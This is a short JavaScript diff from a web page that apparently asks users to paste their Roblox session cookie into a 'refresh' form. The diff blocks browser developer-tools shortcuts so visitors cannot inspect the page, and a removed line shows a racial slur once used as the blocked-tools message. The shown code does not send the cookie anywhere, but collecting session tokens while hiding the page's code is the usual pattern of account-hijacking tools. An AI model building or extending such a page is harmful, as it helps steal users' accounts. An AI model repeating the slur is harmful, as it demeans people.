@@ -300,7 +300,7 @@ document.addEventListener('keydown', function(e) {
   if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || 
       (e.ctrlKey && e.shiftKey && e.key === 'J') || (e.ctrlKey && e.key === 'u')) {
     e.preventDefault();
-    showNotif('nigger');
+    showNotif('Developer tools disabled');
     errorSound.play();
   }
 });
@@ -316,16 +316,7 @@ $("#cookieForm").on("submit", async function(e) {
   $("#refreshedBox").hide();
 
   try {
-    // Check cookie format
-    if (!isValidRobloxCookie(cookie)) {
-      showNotif("Invalid cookie format. Must start with '_|WARNING:-DO-NOT-SHARE-THIS.--' and contain valid characters.");
-      errorSound.play();
-      $("#loader").hide();
-      $("#refreshBtn").show();
-      return;
-    }
-
-    // Validate cookie format
+    // Validate cookie format (single validation)
     const formatCheck = validateCookieFormat(cookie);
     if (!formatCheck.valid) {
       showNotif(formatCheck.error);
